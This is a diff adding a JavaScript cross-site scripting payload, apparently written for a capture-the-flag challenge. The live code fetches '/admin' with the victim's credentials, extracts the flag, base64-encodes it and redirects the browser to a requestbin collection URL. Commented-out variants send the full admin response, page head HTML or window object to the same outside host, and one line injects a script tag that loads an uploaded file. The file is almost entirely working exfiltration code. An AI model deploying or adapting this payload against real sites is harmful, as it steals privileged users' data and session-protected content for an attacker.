@@ -1,0 +1,40 @@
+// Search the admin page for JUST the flag!
+
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() { 
+    if (xhr.readyState == 4) 
+    {
+            x = xhr.response.indexOf("{")
+            y = xhr.response.indexOf("}")
+            flag = xhr.response.substring(x,y)
+            if(xhr.response == ""){ return; }
+            else{
+                document.location = 'http://requestbin.fullcontact.com/1ec6u9w1?data='+encodeURI(btoa(flag));
+            }
+    }
+}
+url = "/admin"
+xhr.open('GET', url,true);
+xhr.withCredentials = true;
+
+xhr.send(null);
+
+// // document.location = 'https://requestbin.fullcontact.com/s6xlfys6?html=' + btoa(document.head.innerHTML)
+
+// // a = $.get('http://localhost:1337/admin')
+// // document.location = 'http://requestbin.fullcontact.com/1ec6u9w1?data='+btoa(window);
+
+// var xhr = new XMLHttpRequest();
+// xhr.onreadystatechange = function() { 
+//     if (xhr.readyState == 4) 
+//     {
+//            document.location = 'http://requestbin.fullcontact.com/1ec6u9w1?data='+encodeURI(btoa(xhr.response));
+//     }
+// }
+// url = "/admin"
+// xhr.open('GET', url,true);
+// xhr.withCredentials = true;
+
+// xhr.send(null);
+
+// // <script src=/a/pfp></script>
